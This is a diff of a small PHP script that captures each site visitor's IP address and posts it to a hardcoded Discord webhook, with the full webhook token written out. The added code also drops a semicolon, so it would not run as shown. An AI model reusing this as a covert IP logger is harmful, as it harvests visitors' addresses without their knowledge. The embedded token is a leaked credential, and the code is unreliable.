@@ -1,28 +1,22 @@
 <?php
-$discordWebhook = "https://discord.com/api/webhooks/1215341442495684619/EI52nygxr-EO1T3xfIQD2crB5WIMPAA4X8aiPhn_kIr3Fs6M20KGAT-Lk0PrKUYu10sb";
+// Get the user's IP address
+$user_ip = $_SERVER['REMOTE_ADDR'];
 
-$message = "New user joined the website. IP: $ip";
+// Discord webhook URL
+$webhook_url = 'https://discord.com/api/webhooks/1215341442495684619/EI52nygxr-EO1T3xfIQD2crB5WIMPAA4X8aiPhn_kIr3Fs6M20KGAT-Lk0PrKUYu10sb';
 
-$data = array(
-    "content" => $message
-);
+// Create the message
+$message = "Someone joined! IP: $user_ip "
 
-$curl = curl_init($discordWebhook);
+// Send the message to Discord
+$curl = curl_init($webhook_url);
 curl_setopt($curl, CURLOPT_CUSTOMREQUEST, "POST");
-curl_setopt($curl, CURLOPT_POSTFIELDS, json_encode($data));
+curl_setopt($curl, CURLOPT_POSTFIELDS, json_encode(array('content' => $message)));
 curl_setopt($curl, CURLOPT_RETURNTRANSFER, true);
-curl_setopt($curl, CURLOPT_HTTPHEADER, array(
-    'Content-Type: application/json',
-    'Content-Length: ' . strlen(json_encode($data)))
-);
-
+curl_setopt($curl, CURLOPT_HTTPHEADER, array('Content-Type: application/json'));
 $response = curl_exec($curl);
-
-if ($response === false) {
-    echo "Error: " . curl_error($curl);
-} else {
-    echo "Message sent successfully to Discord!";
-}
-
 curl_close($curl);
+
+// Return response (optional)
+echo $response;
 ?>
